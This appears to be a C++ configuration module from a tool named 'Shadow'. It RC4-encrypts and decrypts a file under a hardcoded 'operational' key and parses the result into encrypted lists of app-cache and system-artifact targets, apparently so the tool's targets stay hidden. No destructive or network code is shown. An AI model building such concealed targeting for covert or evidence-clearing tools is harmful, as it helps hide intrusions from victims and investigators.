#include "config.h"

#include <fstream>
#include <sstream>
#include <iostream>

namespace Shadow {

// Hardcoded internal key for the cipher.
// In a real targeted deployment, this would be randomized per-build.
static const std::string INTERNAL_KEY = "SHADOW_OPERATIONAL_KEY_2026_X79";

void Config::applyCipher(std::string& data) {
    // Lightweight RC4 Stream Cipher
    unsigned char S[256];
    for (int i = 0; i < 256; i++) {
        S[i] = static_cast<unsigned char>(i);
    }

    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + INTERNAL_KEY[i % INTERNAL_KEY.length()]) % 256;
        std::swap(S[i], S[j]);
    }

    int i = 0;
    j = 0;
    for (size_t n = 0; n < data.length(); n++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        std::swap(S[i], S[j]);
        int K = S[(S[i] + S[j]) % 256];
        data[n] ^= K;
    }
}

bool Config::encryptToFile(const std::string& plainFile, const std::string& outFile) {
    std::ifstream in(plainFile, std::ios::binary);
    if (!in.is_open()) return false;

    std::string content((std::istreambuf_iterator<char>(in)),
                         std::istreambuf_iterator<char>());
    in.close();

    applyCipher(content);

    std::ofstream out(outFile, std::ios::binary);
    if (!out.is_open()) return false;

    out.write(content.c_str(), content.size());
    return true;
}

bool Config::loadEncrypted(const std::string& filepath) {
    std::ifstream in(filepath, std::ios::binary);
    if (!in.is_open()) return false;

    std::string content((std::istreambuf_iterator<char>(in)),
                         std::istreambuf_iterator<char>());
    in.close();

    // Decrypt (RC4 is symmetric)
    applyCipher(content);

    // Parse the decrypted string.
    // Format expectation:
    // [APP_CACHE]
    // target1
    // target2
    // [SYSTEM_ARTIFACTS]
    // target3
    // target4

    std::istringstream stream(content);
    std::string line;
    int currentSection = 0; // 1 = App Cache, 2 = System Artifacts

    while (std::getline(stream, line)) {
        // Strip carriage returns if present
        if (!line.empty() && line.back() == '\r') line.pop_back();
        if (line.empty()) continue;

        if (line == "[APP_CACHE]") {
            currentSection = 1;
            continue;
        } else if (line == "[SYSTEM_ARTIFACTS]") {
            currentSection = 2;
            continue;
        }

        if (currentSection == 1) {
            m_appCacheTargets.push_back(line);
        } else if (currentSection == 2) {
            m_systemArtifactTargets.push_back(line);
        }
    }

    return (!m_appCacheTargets.empty() || !m_systemArtifactTargets.empty());
}

const std::vector<std::string>& Config::getAppCacheTargets() const {
    return m_appCacheTargets;
}

const std::vector<std::string>& Config::getSystemArtifactTargets() const {
    return m_systemArtifactTargets;
}

} // namespace Shadow
